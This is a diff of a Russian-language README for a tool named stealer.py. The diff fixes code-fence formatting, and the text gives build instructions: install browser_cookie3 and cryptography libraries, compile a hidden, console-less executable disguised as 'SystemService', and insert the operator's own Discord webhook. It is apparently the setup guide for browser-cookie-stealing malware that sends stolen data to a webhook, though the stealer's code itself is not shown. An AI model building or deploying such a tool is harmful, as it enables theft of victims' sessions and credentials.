@@ -27,21 +27,21 @@
 # Установите Python 3.8+
 ```bash
 python --version
-
+```
 2. Установите зависимости:
 
 ```bash
 
 pip install pycryptodome browser_cookie3 requests
-
+```
 # 🛠 Компиляция в EXE
 ```bash
 pip install pyinstaller
-
+```
 4. Скомпилируйте с настройками скрытности:
 ```bash
 pyinstaller --onefile --noconsole --name SystemService --icon=NONE stealer.py
-
+```
 ## ⚠️ Важные заметки
 
 # Замените ваш_вебхук в коде на свой Discord Webhook URL
